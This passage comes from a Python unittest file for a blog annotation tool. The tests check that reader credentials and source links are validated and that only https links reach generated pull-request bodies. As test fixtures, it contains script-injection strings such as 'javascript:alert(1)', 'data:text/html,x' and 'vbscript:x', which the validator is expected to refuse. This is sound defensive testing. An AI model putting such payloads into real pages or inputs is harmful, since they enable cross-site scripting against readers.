                           exact="AES-GCM is an authenticated encryption mode.")
        self.assertEqual(out["changed_path"], "static/annotations/posts--a-post.json")
        self.assertEqual(len(self.notes("posts--a-post.json")), 1)

    def test_note_stores_reader_exact_and_credentials(self):
        self.comment(exact="AES & GCM are paired.", about="Jane, a cryptographer",
                     source="https://example.org/paper")
        e = self.notes("pdag.json")[0]
        self.assertEqual(e["exact"], "AES & GCM are paired.")
        self.assertEqual(e["about"], "Jane, a cryptographer")
        self.assertEqual(e["source"], "https://example.org/paper")
        self.assertEqual(set(e), {"id", "exact", "prefix", "suffix", "comment",
                                  "author", "about", "source", "issue", "created_at"})

    def test_note_credentials_default_to_empty(self):
        self.comment()
        e = self.notes("pdag.json")[0]
        self.assertEqual((e["about"], e["source"]), ("", ""))

    def test_credentials_block_links_only_https(self):
        out = self.comment(about="Jane, https://jane.example/ and javascript:alert(1)")
        body = Path(out["body_path"]).read_text()
        self.assertIn("### About the suggester (self-described)", body)
        links = body.split("Links:", 1)[1].split("###", 1)[0]
        self.assertIn("https://jane.example/", links)
        self.assertNotIn("javascript:", links)
        fenced = False
        for line in body.split("\n"):
            if line.startswith("```"):
                fenced = not fenced
            elif "javascript:" in line:
                self.assertTrue(fenced, "javascript: outside a fence")

    def test_credentials_links_skip_github_issue_and_pr_urls(self):
        about = ("Jane, see https://github.com/octo/repo/issues/12 and "
                 "https://GitHub.com/a/b/pull/3#issuecomment-9 and https://www.github.com/a/b/issues/4")
        out = self.comment(about=about, source="https://jane.example/paper")
        body = Path(out["body_path"]).read_text()
        links = body.split("Links:", 1)[1].split("###", 1)[0]
        self.assertIn("https://jane.example/paper", links)
        for frag in ("/issues/12", "/pull/3", "/issues/4"):
            self.assertNotIn(frag, links)
        fenced = False
        for line in body.split("\n"):
            if line.startswith("```"):
                fenced = not fenced
            elif "github.com/" in line.lower() and ("/issues/" in line or "/pull/" in line):
                self.assertTrue(fenced, f"issue or PR URL outside a fence: {line!r}")
        self.assertIn("https://github.com/octo/repo/issues/12", body)
        # A repo or profile link is not a cross-reference, so it stays listed.
        out = self.comment(about="https://github.com/janedoe and https://github.com/a/b")
        links = Path(out["body_path"]).read_text().split("Links:", 1)[1]
        self.assertIn("https://github.com/janedoe", links)
        self.assertIn("https://github.com/a/b", links)

    def test_credentials_block_absent_when_not_given(self):
        body = Path(self.comment()["body_path"]).read_text()
        self.assertNotIn("About the suggester", body)
        self.assertNotIn("Links:", body)

    def test_rewrite_pr_body_carries_credentials(self):
        out = self.run_script(form(
            comment="Why.", replacement="New prose.", about="Jane",
            source="see https://x.example/a", file="static/pdag/index.html",
            exact="Plain prose can be rewritten."))[1]
        body = Path(out["body_path"]).read_text()
        self.assertLess(body.index("### About the suggester"),
                        body.index("### The text as it stands"))
        self.assertIn("### Source", body)

    def test_deep_link_uses_the_readers_text_not_the_source(self):
        (self.root / "config.toml").write_text('baseURL = "https://levduc.github.io/"\n')
        out = self.comment(exact="AES & GCM are paired.")
        body = Path(out["body_path"]).read_text()
        self.assertIn("AES%20%26%20GCM", body)
        self.assertNotIn("amp%3B", body)
        out = self.go_replace("AES & GCM are paired.", "AES and GCM are paired.")
        body = Path(out["body_path"]).read_text()
        self.assertIn("AES%20%26%20GCM", body)
        self.assertNotIn("amp%3B", body)

    def go_replace(self, exact, rep):
        return self.run_script(form(replacement=rep, file="static/pdag/index.html",
                                    exact=exact))[1]

    def test_manual_comment_link_uses_the_readers_text(self):
        (self.root / "config.toml").write_text('baseURL = "https://levduc.github.io/"\n')
        out = self.go_replace("AES & GCM are paired.", "costs $5")
        c = Path(out["comment_path"]).read_text()
        self.assertIn("AES%20%26%20GCM", c)
        self.assertNotIn("amp%3B", c)


class TestCredentialsSchemeRule(Harness):
    def v(self, **kw):
        fields = dict(comment="c", replacement="", about="", source="",
                      file="static/pdag/index.html", exact="Plain prose can be rewritten.",
                      prefix="", suffix="")
        fields.update(kw)
        return apply_suggestion.validate(fields, self.root)

    def test_credentials_scheme_rule(self):
        for kw in ({"about": "Jane: a cryptographer"}, {"source": "arXiv:2101.00001"},
                   {"source": "doi:10.1145/123"}):
            with self.subTest(kw=kw):
                self.v(**kw)
        for kw in ({"source": "javascript:alert(1)"}, {"source": "  JavaScript:alert(1)"},
                   {"about": "data:text/html,x"}):
            with self.subTest(kw=kw):
                with self.assertRaises(apply_suggestion.Refused) as cm:
                    self.v(**kw)
                self.assertIn("https", str(cm.exception))

    def test_checker_scheme_rule(self):
        import check_annotations as ca
        for src, ok in (("arXiv:2101.00001", True), ("vbscript:x", False)):
            p = self.root / "n.json"
            p.write_text(json.dumps([{"id": "s1", "exact": "x", "comment": "c",
                                      "issue": 1, "source": src}]))
            with self.subTest(src=src):
                self.assertEqual(ca.check(p) == [], ok)


if __name__ == "__main__":
    unittest.main(verbosity=2)
